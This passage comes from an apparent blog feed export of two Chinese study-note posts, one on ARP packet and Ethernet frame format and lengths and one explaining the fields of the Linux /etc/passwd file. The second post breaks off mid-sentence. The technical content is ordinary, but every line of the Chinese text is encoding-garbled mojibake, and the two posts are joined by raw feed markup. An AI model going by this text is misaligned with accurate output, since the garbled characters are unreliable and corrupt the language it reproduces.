<p><strong>ç›®çš„ç¡¬ä»¶åœ°å€</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦å­—æ®µï¼Œç”¨æ¥å®šä¹‰ç›®æ ‡çš„ç‰©ç†åœ°å€ï¼Œä¾‹å¦‚ï¼Œå¯¹ä»¥å¤ªç½‘æ¥è¯´è¿™ä¸ªå­—æ®µä½6å­—èŠ‚ã€‚å¯¹äºARPè¯·æ±‚æŠ¥æ–‡ï¼Œè¿™ä¸ªå­—æ®µä¸ºå…¨0ï¼Œå› ä¸ºå‘é€æ–¹å¹¶ä¸çŸ¥é“ç›®æ ‡çš„ç¡¬ä»¶åœ°å€ã€‚</p>
<p><strong>ç›®çš„é€»è¾‘åœ°å€</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦å­—æ®µï¼Œç”¨æ¥å®šä¹‰ç›®æ ‡çš„é€»è¾‘ï¼ˆIPï¼‰åœ°å€ï¼Œ<code>å¯¹äºIPv4åè®®è¿™ä¸ªå­—æ®µçš„é•¿åº¦ä¸º4ä¸ªå­—èŠ‚ã€‚</code></p>
<p>ARPæŠ¥æ–‡ä¸æ˜¯ç›´æ¥åœ¨ç½‘ç»œå±‚ä¸Šå‘é€çš„ï¼Œå®ƒè¿˜æ˜¯éœ€è¦å‘ä¸‹ä¼ è¾“åˆ°æ•°æ®é“¾è·¯å±‚ï¼Œæ‰€ä»¥å½“ARPæŠ¥æ–‡ä¼ è¾“åˆ°æ•°æ®é“¾è·¯å±‚ä¹‹åï¼Œéœ€è¦å†æ¬¡è¿›è¡Œå°è£…ã€‚ä»¥ä»¥å¤ªç½‘ä¸ºä¾‹ï¼ŒARPæŠ¥æ–‡ä¼ è¾“åˆ°ä»¥å¤ªç½‘æ•°æ®é“¾è·¯å±‚åä¼šå½¢æˆARPå¸§ã€‚ARPå¸§å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä»–å°±æ˜¯åœ¨ARPæŠ¥æ–‡å‰é¢åŠ äº†ä¸€ä¸ªä»¥å¤ªç½‘å¸§å¤´ã€‚</p>
<hr>
<h3 id="ARPå¸§æ ¼å¼"><a href="#ARPå¸§æ ¼å¼" class="headerlink" title="ARPå¸§æ ¼å¼"></a>ARPå¸§æ ¼å¼</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnm4nj30s706j440.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnm4nj30s706j440.jpg" class="lazyload" title="test"></a></p>
<ul>
<li><p>ç›®çš„MACåœ°å€ï¼šå 6å­—èŠ‚ï¼Œå¦‚æœæ˜¯ARPè¯·æ±‚å¸§ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå¹¿æ’­å¸§ï¼Œæ‰€ä»¥è¦å¡«ä¸Šå¹¿æ’­MACåœ°å€ï¼ˆFF-FF-FF-FF-FF-FFï¼‰ï¼Œå…¶ç›®æ ‡ä¸»æœºæ˜¯ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºã€‚</p>
</li>
<li><p>æºMACåœ°å€ï¼šå 6å­—èŠ‚ï¼Œè¿™æ˜¯å‘é€ARPå¸§çš„èŠ‚ç‚¹MACåœ°å€ã€‚</p>
</li>
<li><p>å¸§ç±»å‹ï¼šå ä¸¤å­—èŠ‚ï¼Œè¿™é‡Œç”¨æ¥æ ‡è¯†å¸§å°è£…çš„ä¸Šå±‚åè®®ï¼Œå› ä¸ºæœ¬å¸§çš„æ•°æ®éƒ¨åˆ†æ˜¯ARPæŠ¥æ–‡ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ARPçš„åè®®å·0x0806è¡¨ç¤ºå°±å¯ä»¥äº†ã€‚</p>
</li>
</ul>
<hr>
<h3 id="ARPæŠ¥æ–‡æ€»é•¿åº¦"><a href="#ARPæŠ¥æ–‡æ€»é•¿åº¦" class="headerlink" title="ARPæŠ¥æ–‡æ€»é•¿åº¦"></a>ARPæŠ¥æ–‡æ€»é•¿åº¦</h3><p>ARPæŠ¥æ–‡çš„æ€»é•¿åº¦ä¸º64å­—èŠ‚ã€‚</p>
<p>é¦–å…ˆè¦çŸ¥é“å¸§çš„æ¦‚å¿µ å¸§æ˜¯åœ¨æ•°æ®é“¾è·¯å±‚ä¼ è¾“çš„æ•°æ®æ ¼å¼ï¼Œæ¯”å¦‚ä»¥å¤ªç½‘v2ï¼Œä»¥å¤ªç½‘IEEE802.3å’ŒPPPç­‰ã€‚</p>
<p>æ‰€ä»¥WiresharkæŠ“åˆ°çš„å¸§æ˜¯åŒ…å«å¸§å¤´çš„ï¼Œå³<code>åŒ…å«ä»¥å¤ªç½‘v2çš„å¸§å¤´ï¼Œé•¿14 bytes</code>ï¼›</p>
<p>è€ŒARPæ•°æ®åŒ…çš„é•¿åº¦å›ºå®šä¸º <code>28 bytes</code>ï¼›</p>
<p>å¸§æ€»é•¿åº¦ = å¸§å¤´ + ç½‘ç»œå±‚åŒ…å¤´ + ä¼ è¾“å±‚æŠ¥æ–‡å¤´ + åº”ç”¨æ•°æ®ï¼›</p>
<p>è€ŒARPè¯·æ±‚ä¸­ARPåŒ…å·²ç»æ˜¯æœ€é«˜å±‚ï¼Œä¹‹ä¸Šæ²¡æœ‰ä¼ è¾“å±‚å’Œåº”ç”¨å±‚ï¼Œæ‰€ä»¥æ€»é•¿åº¦ä¸ºï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¸§æ€»é•¿åº¦ &#x3D; å¸§å¤´ + ARPåŒ…å¤´ &#x3D; 14 + 28 &#x3D; 42 bytes</span><br></pre></td></tr></table></figure></div>
<p>è€ŒçœŸæ­£å‘åŒ…çš„æ—¶ä¸ºäº†ä¿è¯ä»¥å¤ªç½‘å¸§çš„æœ€å°å¸§é•¿ä¸º <code>64 bytes</code> ï¼Œä¼šåœ¨æŠ¥æ–‡é‡Œæ·»åŠ ä¸€ä¸ªpaddingå­—æ®µï¼Œç”¨æ¥å¡«å……æ•°æ®åŒ…å¤§å°ã€‚</p>
<p>ä½¿ç”¨wiresharkæŠ“åŒ…æ—¶ï¼ŒæŠ“åˆ°çš„åŒ…ä¸º60 bytesã€‚æ¯”ä»¥å¤ªç½‘å¸§çš„æœ€å°å¸§é•¿æ‰«äº†4 bytesï¼ŒåŸå› æ˜¯å› ä¸ºwiresharkæŠ“åŒ…æ—¶ä¸èƒ½æŠ“åˆ°æ•°æ®åŒ…æœ€åçš„CRCå­—æ®µã€‚</p>
<p>CRCå­—æ®µæ˜¯ä¸ºäº†æ ¡éªŒä»¥å¤ªç½‘å¸§çš„æ­£ç¡®æ€§ã€‚åœ¨æ•°æ®åŒ…å¡«å……å®Œæˆåï¼Œå›å»é€šè¿‡ç®—æ³•è®¡ç®—ä¸€ä¸ªå€¼æ”¾åˆ°æ•°æ®åŒ…çš„CRCå­—æ®µä¸­ã€‚å½“æ¥å—ç«¯æ”¶åˆ°æ•°æ®åŒ…åï¼Œä¼šåŒæ ·ä½¿ç”¨ç®—æ³•è®¡ç®—ä¸€ä¸ªå€¼ï¼Œç„¶åå’ŒCRCå­—æ®µçš„å€¼è¿›è¡Œå¯¹æ¯”ï¼ŒæŸ¥çœ‹æ˜¯å¦ç›¸åŒã€‚å¦‚æœä¸åŒåˆ™è¯æ˜æ•°æ®åŒ…è¢«æ›´æ”¹ï¼Œå¦‚æœç›¸åŒåˆ™è¯æ˜æ•°æ®åŒ…å¹¶æœªè¢«æ›´æ”¹ã€‚</p>
<hr>
<h1 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h1><p><a href="https://blog.csdn.net/ever_peng/article/details/80008638" target="_blank" rel="noopener">ARPåè®®è¯¦è§£</a><br><a href="https://blog.csdn.net/u011784495/article/details/71716586" target="_blank" rel="noopener">ARPåè®®æŠ¥æ–‡æ ¼å¼åŠARPè¡¨</a><br>ã€Šè®¡ç®—æœºç½‘ç»œã€‹(ç¬¬ä¸ƒç‰ˆ) è°¢å¸Œä»è‘—<br>ã€Šè®¡ç®—æœºç½‘ç»œï¼šè‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹ï¼ˆç¬¬ä¸ƒç‰ˆï¼‰</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux /etc/passwd å†…å®¹è§£é‡Š</title>
    <url>/yakko117/2020/01/13/Linux_etc_passwd/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Linux-passwd-æ–‡ä»¶è¯¦è§£"><a href="#Linux-passwd-æ–‡ä»¶è¯¦è§£" class="headerlink" title="Linux passwd æ–‡ä»¶è¯¦è§£"></a>Linux passwd æ–‡ä»¶è¯¦è§£</h1><p>åœ¨ <code>Linux /etc/passwd</code> æ–‡ä»¶ä¸­æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„è®°å½•è¡Œï¼Œå®ƒè®°å½•äº†è¿™ä¸ªç”¨æˆ·çš„ä¸€äº›åŸºæœ¬å±æ€§ã€‚ç³»ç»Ÿç®¡ç†å‘˜ç»å¸¸ä¼šæ¥è§¦åˆ°è¿™ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ä»¥å®Œæˆå¯¹ç”¨æˆ·çš„ç®¡ç†å·¥ä½œã€‚</p>
<h2 id="é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹å¸¸è§çš„é…ç½®æ–‡ä»¶"><a href="#é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹å¸¸è§çš„é…ç½®æ–‡ä»¶" class="headerlink" title="é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹å¸¸è§çš„é…ç½®æ–‡ä»¶"></a>é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹å¸¸è§çš„é…ç½®æ–‡ä»¶</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶: &#x2F;etc&#x2F;passwd</span><br><span class="line">å¯†ç æ–‡ä»¶: &#x2F;etc&#x2F;shadow</span><br><span class="line">ç”¨æˆ·ç»„æ–‡ä»¶: &#x2F;etc&#x2F;group</span><br><span class="line">ç”¨æˆ·ç»„å¯†ç æ–‡ä»¶: &#x2F;etc&#x2F;gshadow</span><br><span class="line">ç”¨æˆ·é…ç½®æ–‡ä»¶</span><br><span class="line">    &#x2F;etc&#x2F;login.defs</span><br><span class="line">    &#x2F;etc&#x2F;default&#x2F;useradd</span><br><span class="line">æ–°ç”¨æˆ·ç™»é™†ä¿¡æ¯æ–‡ä»¶: &#x2F;etc&#x2F;skel</span><br><span class="line">ç™»é™†ä¿¡æ¯: &#x2F;etc&#x2F;motd</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æˆ·ç®¡ç†æœ‰ä¸¤ä¸ªæœ€é‡è¦çš„é…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ä¿å­˜ç”¨æˆ·ä¿¡æ¯çš„æ–‡ä»¶ <code>/etc/passwd</code>ï¼Œä¸€ä¸ªæ˜¯ä¿å­˜äº†ç”¨æˆ·å¯†ç çš„æ–‡ä»¶ <code>/etc/shadow</code>ã€‚</p>
<hr>
<h2 id="etc-passwd-æ–‡ä»¶æ ¼å¼"><a href="#etc-passwd-æ–‡ä»¶æ ¼å¼" class="headerlink" title="/etc/passwd æ–‡ä»¶æ ¼å¼"></a>/etc/passwd æ–‡ä»¶æ ¼å¼</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gavxphxn1fj30mj0b7wgd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gavxphxn1fj30mj0b7wgd.jpg" class="lazyload" title="test"></a></p>
<p>ä»ä¸Šé¢çš„ä¾‹å­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>/etc/passwd</code> ä¸­ä¸€è¡Œè®°å½•å¯¹åº”ç€ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯è¡Œè®°å½•åˆè¢«å†’å·(:)åˆ†éš”ä¸º7ä¸ªå­—æ®µï¼Œå…¶æ ¼å¼å’Œå…·ä½“å«ä¹‰å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shell</span><br></pre></td></tr></table></figure></div>

<h3 id="ç”¨æˆ·å"><a href="#ç”¨æˆ·å" class="headerlink" title="ç”¨æˆ·å"></a>ç”¨æˆ·å</h3><p>ä»£è¡¨ç”¨æˆ·è´¦å·çš„å­—ç¬¦ä¸²ã€‚é€šå¸¸é•¿åº¦ä¸è¶…è¿‡8ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ç”±<code>å¤§å°å†™å­—æ¯</code>å’Œ<code>/</code>æˆ–<code>æ•°å­—</code>ç»„æˆã€‚ç™»å½•åä¸­ä¸èƒ½æœ‰å†’å·<code>(:)</code>ï¼Œå› ä¸ºå†’å·åœ¨è¿™é‡Œæ˜¯åˆ†éš”ç¬¦ã€‚ä¸ºäº†å…¼å®¹èµ·è§ï¼Œ<code>ç™»å½•åä¸­æœ€å¥½ä¸è¦åŒ…å«ç‚¹å­—ç¬¦(.)</code>ï¼Œå¹¶ä¸”ä¸ä½¿ç”¨<code>è¿å­—ç¬¦(-)</code>å’Œ<code>åŠ å·(+)</code>æ‰“å¤´ã€‚</p>
<hr>
<h3 id="å£ä»¤"><a href="#å£ä»¤" class="headerlink" title="å£ä»¤"></a>å£ä»¤</h3><p>ä¸€äº›ç³»ç»Ÿä¸­ï¼Œå­˜æ”¾ç€åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ã€‚è™½ç„¶è¿™ä¸ªå­—æ®µå­˜æ”¾çš„åªæ˜¯ç”¨æˆ·å£ä»¤çš„åŠ å¯†ä¸²ï¼Œä¸æ˜¯æ˜æ–‡ï¼Œä½†æ˜¯ç”±äº<code>/etc/passwd</code>æ–‡ä»¶å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œæ‰€ä»¥è¿™ä»æ˜¯ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç°åœ¨è®¸å¤šLinuxç³»ç»Ÿï¼ˆå¦‚SVR4ï¼‰éƒ½ä½¿ç”¨äº†shadowæŠ€æœ¯ï¼ŒæŠŠçœŸæ­£çš„åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—å­˜æ”¾åˆ° <code>/etc/shadow</code>æ–‡ä»¶ä¸­ï¼Œè€Œåœ¨ <code>/etc/passwd</code> æ–‡ä»¶çš„å£ä»¤å­—æ®µä¸­åªå­˜æ”¾ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚<strong>â€œxâ€</strong>æˆ–è€…<strong>â€œ*â€œ</strong>ï¼Œè¿™é‡Œçš„ <strong>â€œxâ€</strong> ä»£è¡¨çš„æ˜¯å¯†ç æ ‡å¿—ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å¯†ç ï¼ŒçœŸæ­£çš„å¯†ç æ˜¯ä¿å­˜åœ¨ <code>/etc/shadow</code> æ–‡ä»¶ä¸­çš„ã€ã€‚ </p>
<hr>
<h3 id="ç”¨æˆ·æ ‡è¯†å·-UID"><a href="#ç”¨æˆ·æ ‡è¯†å·-UID" class="headerlink" title="ç”¨æˆ·æ ‡è¯†å· UID"></a>ç”¨æˆ·æ ‡è¯†å· UID</h3><p>æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œç³»ç»Ÿå†…éƒ¨ç”¨å®ƒæ¥æ ‡è¯†ç”¨æˆ·ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å®ƒä¸ç”¨æˆ·åæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚å¦‚æœå‡ ä¸ªç”¨æˆ·åå¯¹åº”çš„ç”¨æˆ·æ ‡è¯†å·æ˜¯ä¸€æ ·çš„ï¼Œç³»ç»Ÿå†…éƒ¨å°†æŠŠå®ƒä»¬è§†ä¸ºåŒä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯å®ƒä»¬å¯ä»¥æœ‰ä¸åŒçš„å£ä»¤ã€ä¸åŒçš„ä¸»ç›®å½•ä»¥åŠä¸åŒçš„ç™»å½•Shellç­‰ã€‚é€šå¸¸ç”¨æˆ·æ ‡è¯†å·çš„å–å€¼èŒƒå›´æ˜¯0ï½65535ã€‚</p>
<table>
<thead>
<tr>
<th>UIDèŒƒå›´</th>
<th>ç”¨æˆ·èº«ä»½</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>è¶…çº§ç”¨æˆ· UIDã€‚UID ä¸º 0 å°±ä»£è¡¨è¿™ä¸ªè´¦å·æ˜¯ç®¡ç†å‘˜è´¦å·ã€‚åœ¨ Linux ä¸­ï¼Œå¦‚ä½•æŠŠæ™®é€šç”¨æˆ·å‡çº§æˆç®¡ç†å‘˜å‘¢ï¼Ÿåªéœ€æŠŠå…¶ä»–ç”¨æˆ·çš„ UID ä¿®æ”¹ä¸º 0 å°±å¯ä»¥äº†ï¼Œè¿™ä¸€ç‚¹å’Œ Windows æ˜¯ä¸åŒçš„ã€‚ä¸è¿‡ä¸å»ºè®®å»ºç«‹å¤šä¸ªç®¡ç†å‘˜è´¦å·ã€‚</td>
</tr>
<tr>
<td>1~499</td>
<td>ç³»ç»Ÿç”¨æˆ·ï¼ˆä¼ªç”¨æˆ·ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤èŒƒå›´çš„ UID ä¿ç•™ç»™ç³»ç»Ÿä½¿ç”¨ã€‚å…¶ä¸­ï¼Œ1<del>99 ç”¨äºç³»ç»Ÿè‡ªè¡Œåˆ›å»ºçš„è´¦å·ï¼›100</del>499 åˆ†é…ç»™æœ‰ç³»ç»Ÿè´¦å·éœ€æ±‚çš„ç”¨æˆ·ã€‚å…¶å®ï¼Œé™¤äº† <code>0</code> ä¹‹å¤–ï¼Œå…¶ä»–çš„ UID å¹¶æ— ä¸åŒï¼Œè¿™é‡Œåªæ˜¯é»˜è®¤ 500 ä»¥ä¸‹çš„æ•°å­—ç»™ç³»ç»Ÿä½œä¸ºä¿ç•™è´¦æˆ·ï¼Œåªæ˜¯ä¸€ä¸ªå…¬è®¤çš„ä¹ æƒ¯è€Œå·²ã€‚</td>
</tr>
<tr>
<td>500~65535</td>
<td>æ™®é€šç”¨æˆ·ã€‚é€šå¸¸è¿™äº› UID å·²ç»è¶³å¤Ÿç”¨æˆ·ä½¿ç”¨äº†ã€‚ä½†ä¸å¤Ÿç”¨ä¹Ÿæ²¡å…³ç³»ï¼Œ2.6.x å†…æ ¸ä¹‹åçš„ Linux ç³»ç»Ÿå·²ç»å¯ä»¥æ”¯æŒ $2^{32}$ ä¸ª UID äº†ã€‚</td>
</tr>
</tbody></table>
<hr>
<h3 id="ç»„æ ‡è¯†å·-GID"><a href="#ç»„æ ‡è¯†å·-GID" class="headerlink" title="ç»„æ ‡è¯†å· GID"></a>ç»„æ ‡è¯†å· GID</h3><p>å­—æ®µè®°å½•çš„æ˜¯ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€‚å®ƒå¯¹åº”ç€ <code>/etc/group</code> æ–‡ä»¶ä¸­çš„ä¸€æ¡è®°å½•ã€‚<br>å…¨ç§° <code>&quot;Group ID&quot;</code>ï¼Œç®€ç§° <code>&quot;ç»„ID&quot;</code>ï¼Œè¡¨ç¤ºç”¨æˆ·åˆå§‹ç»„çš„ç»„ ID å·ã€‚è¿™é‡Œéœ€è¦è§£é‡Šä¸€ä¸‹åˆå§‹ç»„å’Œé™„åŠ ç»„çš„æ¦‚å¿µã€‚</p>
<ul>
<li><p><code>åˆå§‹ç»„</code>ï¼ŒæŒ‡ç”¨æˆ·ç™»é™†æ—¶å°±æ‹¥æœ‰è¿™ä¸ªç”¨æˆ·ç»„çš„ç›¸å…³æƒé™ã€‚æ¯ä¸ªç”¨æˆ·çš„åˆå§‹ç»„åªèƒ½æœ‰ä¸€ä¸ªï¼Œé€šå¸¸å°±æ˜¯å°†å’Œæ­¤ç”¨æˆ·çš„ç”¨æˆ·åç›¸åŒçš„ç»„åä½œä¸ºè¯¥ç”¨æˆ·çš„åˆå§‹ç»„ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æ‰‹å·¥æ·»åŠ  <code>ç”¨æˆ· yakko</code>ï¼Œåœ¨å»ºç«‹ <code>ç”¨æˆ· yakko</code> çš„åŒæ—¶ï¼Œå°±ä¼šå»ºç«‹ <code>yakko ç»„</code>ä½œä¸º <code>yakko ç”¨æˆ·</code> çš„åˆå§‹ç»„ã€‚</p>
</li>
<li><p><code>é™„åŠ ç»„</code>ï¼ŒæŒ‡ç”¨æˆ·å¯ä»¥åŠ å…¥å¤šä¸ªå…¶ä»–çš„ç”¨æˆ·ç»„ï¼Œå¹¶æ‹¥æœ‰è¿™äº›ç»„çš„æƒé™ã€‚æ¯ä¸ªç”¨æˆ·åªèƒ½æœ‰ä¸€ä¸ªåˆå§‹ç»„ï¼Œé™¤åˆå§‹ç»„å¤–ï¼Œç”¨æˆ·å†åŠ å…¥å…¶ä»–çš„ç”¨æˆ·ç»„ï¼Œè¿™äº›ç”¨æˆ·ç»„å°±æ˜¯è¿™ä¸ªç”¨æˆ·çš„é™„åŠ ç»„ã€‚é™„åŠ ç»„å¯ä»¥æœ‰å¤šä¸ªï¼Œè€Œä¸”ç”¨æˆ·å¯ä»¥æœ‰è¿™äº›é™„åŠ ç»„çš„æƒé™ã€‚</p>
</li>
</ul>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œåˆšåˆšçš„ <code>yakko ç”¨æˆ·</code>é™¤å±äºåˆå§‹ç»„ yakko å¤–ï¼Œæˆ‘åˆæŠŠå®ƒåŠ å…¥äº† users ç»„ï¼Œé‚£ä¹ˆ yakko ç”¨æˆ·<code>åŒæ—¶å±äº yakko ç»„å’Œ users ç»„</code>ï¼Œå…¶ä¸­ yakko æ˜¯åˆå§‹ç»„ï¼Œusers æ˜¯é™„åŠ ç»„ã€‚</p>
<p>å½“ç„¶ï¼Œåˆå§‹ç»„å’Œé™„åŠ ç»„çš„èº«ä»½æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨å·¥ä½œä¸­ä¸ä¿®æ”¹åˆå§‹ç»„ï¼Œåªä¿®æ”¹é™„åŠ ç»„ï¼Œå› ä¸ºä¿®æ”¹äº†åˆå§‹ç»„æœ‰æ—¶ä¼šè®©ç®¡ç†å‘˜é€»è¾‘æ··ä¹±ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ <code>/etc/passwd</code> æ–‡ä»¶çš„ç¬¬å››ä¸ªå­—æ®µä¸­çœ‹åˆ°çš„ ID æ˜¯è¿™ä¸ªç”¨æˆ·çš„åˆå§‹ç»„ã€‚</p>
<hr>
<h3 id="æ³¨é‡Šæ€§æè¿°"><a href="#æ³¨é‡Šæ€§æè¿°" class="headerlink" title="æ³¨é‡Šæ€§æè¿°"></a>æ³¨é‡Šæ€§æè¿°</h3><p>å­—æ®µè®°å½•ç€ç”¨æˆ·çš„ä¸€äº›ä¸ªäººæƒ…å†µï¼Œä¾‹å¦‚ç”¨æˆ·çš„çœŸå®å§“åã€ç”µè¯ã€åœ°å€ç­‰ï¼Œè¿™ä¸ªå­—æ®µå¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…çš„ç”¨é€”ã€‚åœ¨ä¸åŒçš„Linuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µçš„æ ¼å¼å¹¶æ²¡æœ‰ç»Ÿä¸€ã€‚åœ¨è®¸å¤šLinuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µå­˜æ”¾çš„æ˜¯ä¸€æ®µä»»æ„çš„æ³¨é‡Šæ€§æè¿°æ–‡å­—ï¼Œç”¨åšfingerå‘½ä»¤çš„è¾“å‡ºã€‚</p>
<h3 id="ä¸»ç›®å½•-å’Œ-Shell"><a href="#ä¸»ç›®å½•-å’Œ-Shell" class="headerlink" title="ä¸»ç›®å½• å’Œ Shell"></a>ä¸»ç›®å½• å’Œ Shell</h3><p>ä¹Ÿå°±æ˜¯ç”¨æˆ·çš„èµ·å§‹å·¥ä½œç›®å½•ï¼Œå®ƒæ˜¯ç”¨æˆ·åœ¨ç™»å½•åˆ°ç³»ç»Ÿä¹‹åæ‰€å¤„çš„ç›®å½•ã€‚<br>åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œå„ç”¨æˆ·çš„ä¸»ç›®å½•éƒ½è¢«ç»„ç»‡åœ¨åŒä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸‹ï¼Œè€Œç”¨æˆ·ä¸»ç›®å½•çš„åç§°å°±æ˜¯è¯¥ç”¨æˆ·çš„ç™»å½•åã€‚<br>å„ç”¨æˆ·å¯¹è‡ªå·±çš„ä¸»ç›®å½•æœ‰è¯»ã€å†™ã€æ‰§è¡Œï¼ˆæœç´¢ï¼‰æƒé™ï¼Œå…¶ä»–ç”¨æˆ·å¯¹æ­¤ç›®å½•çš„è®¿é—®æƒé™åˆ™æ ¹æ®å…·ä½“æƒ…å†µè®¾ç½®ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·ç™»å½•åï¼Œè¦å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œè´Ÿè´£å°†ç”¨æˆ·çš„æ“ä½œä¼ ç»™å†…æ ¸</span><br><span class="line">è¿™ä¸ªè¿›ç¨‹æ˜¯ç”¨æˆ·ç™»å½•åˆ°ç³»ç»Ÿåè¿è¡Œçš„å‘½ä»¤è§£é‡Šå™¨æˆ–æŸä¸ªç‰¹å®šçš„ç¨‹åºï¼Œå³Shellã€‚</span><br><span class="line">Shellæ˜¯ç”¨æˆ·ä¸Linuxç³»ç»Ÿä¹‹é—´çš„æ¥å£ã€‚</span><br></pre></td></tr></table></figure></div>

<p>Linuxçš„Shellæœ‰è®¸å¤šç§ï¼Œæ¯ç§éƒ½æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚å¸¸ç”¨çš„æœ‰ä»¥ä¸‹å‡ ç§:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh(BourneShell) csh(CShell)</span><br><span class="line">ksh(KornShell)  tcsh(TENEX&#x2F;TOPS-20typeCShell)</span><br><span class="line">bash(BourneAgainShell)ç­‰ã€‚</span><br></pre></td></tr></table></figure></div>
<p>ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æ ¹æ®ç³»ç»Ÿæƒ…å†µå’Œç”¨æˆ·ä¹ æƒ¯ä¸ºç”¨æˆ·æŒ‡å®šæŸä¸ªShellã€‚<br>å¦‚æœä¸æŒ‡å®šShellï¼Œé‚£ä¹ˆç³»ç»Ÿä½¿ç”¨shä¸ºé»˜è®¤çš„ç™»å½•Shellï¼Œå³è¿™ä¸ªå­—æ®µçš„å€¼ä¸º<code>/bin/sh</code>ã€‚<br>ç”¨æˆ·çš„ç™»å½•Shellä¹Ÿå¯ä»¥æŒ‡å®šä¸ºæŸä¸ªç‰¹å®šçš„ç¨‹åºï¼ˆæ­¤ç¨‹åºä¸æ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼‰ã€‚<br>åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é™åˆ¶ç”¨æˆ·åªèƒ½è¿è¡ŒæŒ‡å®šçš„åº”ç”¨ç¨‹åºï¼Œåœ¨è¯¥åº”ç”¨ç¨‹åºè¿è¡Œç»“æŸåï¼Œç”¨æˆ·å°±è‡ªåŠ¨é€€å‡ºäº†ç³»ç»Ÿã€‚æœ‰äº›Linuxç³»ç»Ÿè¦æ±‚åªæœ‰é‚£äº›åœ¨ç³»ç»Ÿä¸­ç™»è®°äº†çš„ç¨‹åºæ‰è